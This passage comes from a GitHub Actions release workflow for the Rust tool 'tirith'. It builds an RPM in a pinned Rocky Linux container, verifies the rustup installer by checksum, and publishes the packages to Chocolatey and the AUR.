            echo "       apt-installed tirith would fail 'tirith verify-self' (issue #146)."
            exit 1
          fi
          echo "OK: .deb packages the canonical release binary byte-for-byte"

      - name: Upload Debian package artifact
        uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4
        with:
          name: tirith-deb
          path: tirith_*.deb
          if-no-files-found: error

  build-rpm:
    name: Build RPM package
    needs: smoke-test
    if: github.event_name == 'push' && startsWith(github.ref, 'refs/tags/v')
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5 # v4
        with:
          persist-credentials: false

      - name: Build RPM in Rocky Linux container
        env:
          VERSION: ${{ github.ref_name }}
          ROCKY_IMAGE: rockylinux/rockylinux:9@sha256:8101994123cf3d0a8fee517bee7f39e555c7d92bd2d9eb3303cc988a0eeed00f
          RUSTUP_INIT_VERSION: "1.28.2"
          RUSTUP_INIT_SHA256: 20a06e644b0d9bd2fbdbfd52d42540bdde820ea7df86e92e533c073da0cdd43c
          RUST_TOOLCHAIN: "1.97.0"
        run: |
          docker run --rm \
            -e VERSION \
            -e RUSTUP_INIT_VERSION \
            -e RUSTUP_INIT_SHA256 \
            -e RUST_TOOLCHAIN \
            -v ${{ github.workspace }}:/workspace \
            -w /workspace \
            "$ROCKY_IMAGE" bash -c '
            set -euo pipefail
            VER="${VERSION#v}"

            # Install build tools
            dnf install -y --allowerasing gcc rpm-build curl ca-certificates git
            RUSTUP_INIT="/tmp/rustup-init-${RUSTUP_INIT_VERSION}"
            curl --proto "=https" --tlsv1.2 -fsSL \
              "https://static.rust-lang.org/rustup/archive/${RUSTUP_INIT_VERSION}/x86_64-unknown-linux-gnu/rustup-init" \
              -o "$RUSTUP_INIT"
            printf "%s  %s\n" "$RUSTUP_INIT_SHA256" "$RUSTUP_INIT" | sha256sum --check --strict
            chmod 0755 "$RUSTUP_INIT"
            "$RUSTUP_INIT" -y --no-modify-path --profile minimal \
              --default-toolchain "$RUST_TOOLCHAIN"
            source $HOME/.cargo/env
            rustc --version | grep -E "^rustc ${RUST_TOOLCHAIN//./\\.} "

            # Build release binary IN the Rocky container (do NOT swap in the
            # generic ubuntu-built release binary): the .rpm targets RHEL/Rocky 9
            # (glibc 2.34) and the canonical binary is built on ubuntu-22.04
            # (glibc 2.35), which would not run there. The .rpm is therefore
            # intentionally NOT byte-identical to the tarball; `tirith verify-self`
            # carves out Dnf installs as source/distro-built (issue #146).
            cargo build --release --locked -p tirith

            # Generate completions and manpage
            mkdir -p build/{completions,man,shell/lib}
            ./target/release/tirith completions bash > build/completions/tirith.bash
            ./target/release/tirith completions zsh > build/completions/_tirith
            ./target/release/tirith completions fish > build/completions/tirith.fish
            ./target/release/tirith manpage > build/man/tirith.1
            cp shell/tirith.sh build/shell/
            cp shell/lib/* build/shell/lib/

            # Prepare RPM build
            mkdir -p ~/rpmbuild/{BUILD,RPMS,SOURCES,SPECS}
            mkdir -p ~/rpmbuild/SOURCES/shell/lib
            mkdir -p ~/rpmbuild/SOURCES/completions
            mkdir -p ~/rpmbuild/SOURCES/man

            cp target/release/tirith ~/rpmbuild/SOURCES/
            cp build/shell/tirith.sh ~/rpmbuild/SOURCES/shell/
            cp build/shell/lib/* ~/rpmbuild/SOURCES/shell/lib/
            cp build/completions/* ~/rpmbuild/SOURCES/completions/
            cp build/man/* ~/rpmbuild/SOURCES/man/
            cp LICENSE-AGPL ~/rpmbuild/SOURCES/
            cp LICENSE-COMMERCIAL ~/rpmbuild/SOURCES/

            # Update spec version and build
            sed "s/^Version:.*/Version:        ${VER}/" packaging/rpm/tirith.spec > ~/rpmbuild/SPECS/tirith.spec
            rpmbuild -bb ~/rpmbuild/SPECS/tirith.spec --define "_topdir $HOME/rpmbuild"

            # Copy RPM to workspace
            cp ~/rpmbuild/RPMS/x86_64/tirith-*.rpm /workspace/
          '

      - name: Upload RPM package artifact
        uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4
        with:
          name: tirith-rpm
          path: tirith-*.rpm
          if-no-files-found: error

  publish-chocolatey:
    name: Publish to Chocolatey
    needs: release
    if: github.event_name == 'push' && startsWith(github.ref, 'refs/tags/v')
    runs-on: windows-latest
    steps:
      - uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5 # v4
        with:
          persist-credentials: false

      - name: Download Windows artifact
        uses: actions/download-artifact@d3f86a106a0bac45b974a628896c90dbdf5c8093 # v4
        with:
          name: tirith-x86_64-pc-windows-msvc
          path: artifacts
          merge-multiple: true

      - name: Template and pack
        shell: pwsh
        env:
          VERSION: ${{ github.ref_name }}
        run: |
          $version = $env:VERSION.TrimStart("v")
          # Artifact extracts directly to artifacts/
          $hash = (Get-FileHash artifacts/tirith-x86_64-pc-windows-msvc.zip -Algorithm SHA256).Hash

          # Update nuspec
          (Get-Content packaging/chocolatey/tirith.nuspec) -replace '<version>[0-9.]+</version>', "<version>$version</version>" | Set-Content packaging/chocolatey/tirith.nuspec

          # Update install script
          $install = Get-Content packaging/chocolatey/tools/chocolateyinstall.ps1
          $install = $install -replace "\`$version = '[0-9.]+'", "`$version = '$version'"
          $install = $install -replace "\`$checksum = 'PLACEHOLDER'", "`$checksum = '$hash'"
          $install | Set-Content packaging/chocolatey/tools/chocolateyinstall.ps1

          # Pack (cd to chocolatey dir so tools/** paths resolve correctly)
          cd packaging/chocolatey
          choco pack tirith.nuspec --out ${{ github.workspace }}

      - name: Push to Chocolatey
        shell: pwsh
        continue-on-error: true  # Chocolatey moderation can block pushes; don't fail the release
        run: |
          $nupkg = Get-ChildItem -Path ${{ github.workspace }} -Filter "tirith.*.nupkg" | Select-Object -First 1
          & choco push $nupkg.FullName --source https://push.chocolatey.org/ --api-key ${{ secrets.CHOCOLATEY_API_KEY }}
          if ($LASTEXITCODE -ne 0) {
            Write-Warning "Chocolatey push failed (exit $LASTEXITCODE) — previous version may still be in moderation"
          }

  publish-aur:
    name: Update AUR Package
    needs: release
    if: github.event_name == 'push' && startsWith(github.ref, 'refs/tags/v')
    runs-on: ubuntu-latest
    continue-on-error: true  # AUR SSH can be transiently unavailable; don't fail the release
    steps:
      - uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5 # v4
        with:
          persist-credentials: false

      - name: Validate AUR SSH key
        env:
          AUR_KEY: ${{ secrets.AUR_SSH_PRIVATE_KEY }}
        run: |
          if [ -z "$AUR_KEY" ]; then
            echo "::error::AUR_SSH_PRIVATE_KEY secret is not set — cannot publish to AUR"
            exit 1
          fi

      - name: Update PKGBUILD version and checksums
        env:
          VERSION: ${{ github.ref_name }}
        run: |
          VER="${VERSION#v}"
          sed -i "s/^pkgver=.*/pkgver=${VER}/" packaging/aur/PKGBUILD
          sed -i "s/^pkgrel=.*/pkgrel=1/" packaging/aur/PKGBUILD

          # Compute source checksum without keeping the tarball (AUR has a blob size limit)
          # repo-0453: --fail so an HTTP error page is never hashed as the
          # "source archive"; validate the payload is a gzip stream.
          URL="https://github.com/sheeki03/tirith/archive/refs/tags/${VERSION}.tar.gz"
          set -o pipefail
          SHA=$(curl -fsSL "$URL" | tee /tmp/aur-src.tar.gz | sha256sum | cut -d' ' -f1)
          file /tmp/aur-src.tar.gz | grep -q "gzip compressed data"
          sed -i "s/^sha256sums=.*/sha256sums=('${SHA}')/" packaging/aur/PKGBUILD

      - name: Publish to AUR
        uses: KSXGitHub/github-actions-deploy-aur@da03e160361ce01bf087e790b6ffd196d7dccff7 # v4.1.3
        with:
          pkgname: tirith
          pkgbuild: packaging/aur/PKGBUILD
          assets: packaging/aur/tirith.install
          commit_username: sheeki03
          commit_email: shivomsharma03@gmail.com
          ssh_private_key: ${{ secrets.AUR_SSH_PRIVATE_KEY }}
          commit_message: "Update to ${{ github.ref_name }}"
